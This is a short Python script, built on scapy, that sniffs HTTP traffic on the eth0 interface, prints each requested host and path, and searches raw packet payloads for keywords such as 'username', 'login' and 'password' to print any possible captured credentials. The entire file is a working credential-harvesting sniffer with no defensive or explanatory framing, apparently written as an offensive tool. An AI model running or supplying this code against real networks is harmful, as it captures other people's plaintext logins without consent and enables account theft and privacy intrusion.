#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http


def sniffer(interface):
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + \
        packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load_as_str = str(packet[scapy.Raw].load)
        keywords = ['username', 'uname', 'login',
                    'email', 'password', 'passwd', 'pass']
        for keyword in keywords:
            if keyword in load_as_str:
                return load_as_str


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = str(get_url(packet))
        print('[+] HTTP Request: ' + url)

        login_info = get_login_info(packet)
        if login_info:
            print(
                '\n\n[+] Possible username and password: ' + login_info + '\n\n')


sniffer('eth0')